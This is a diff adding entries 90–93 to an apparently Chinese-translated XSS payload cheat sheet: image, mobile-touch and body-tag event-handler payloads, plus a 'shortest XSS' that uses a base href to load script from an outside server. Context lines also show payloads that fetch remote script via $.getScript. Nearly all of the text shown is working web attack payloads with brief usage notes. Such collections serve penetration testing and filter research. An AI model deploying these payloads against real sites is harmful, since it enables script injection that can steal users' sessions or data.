@@ -677,6 +677,44 @@ $input = preg_replace("/:|\\\/", "", htmlentities($input, ENT_QUOTES))
 onload=function(){$.getScript('//brutelogic.com.br/2.js')}
 onload=x=>$.getScript('//brutelogic.com.br/2.js')
 ```
+**90.Image Vectors - Alternative Event Handlers (图像向量-可选事件处理程序)** <br>
+以下payload用于触发事件处理程序,不同于onerror事件。 <br>
+```
+<img
+<image
+src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
+srcset=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
+onload=alert(1)>
+onloadend=alert(1)>
+onloadstart=alert(1)>
+```
+**91.Shortest XSS (最短XSS)** <br>
+当有一个有限xss漏洞利用点时。需要一个javascript脚本调用，通过相对路径放在xss需要加载的位置之后。攻击者服务器必须使用攻击脚本对本机脚本（相同路径）或默认404页（更容易）内完成的确切请求进行响应。域名越短越好。 <br>
+
+```
+<base href=//knoxss.me>
+```
+**92.Mobile-only Event Handlers (仅处理移动端应用)** <br>
+以下payload,针对移动应用程序时使用。<br>
+
+```
+<html ontouchstart=alert(1)>
+<html ontouchend=alert(1)>
+<html ontouchmove=alert(1)>
+<body onorientationchange=alert(1)>
+```
+**93.Body Tag (body 标签)** <br>
+body标签的集合。最后一个只适用于Internet Explorer浏览器。<br>
+```
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><meta content=URL;%23 http-equiv=refresh>
+<body onscroll=alert(1) style=overflow:auto;height:1000px id=x>#x
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><x id=x>#x
+<body onresize=alert(1)>press F12!
+<body onhelp=alert(1)>press F1!
+```
 
 ## 致谢
 **英文议题作者：** <br>
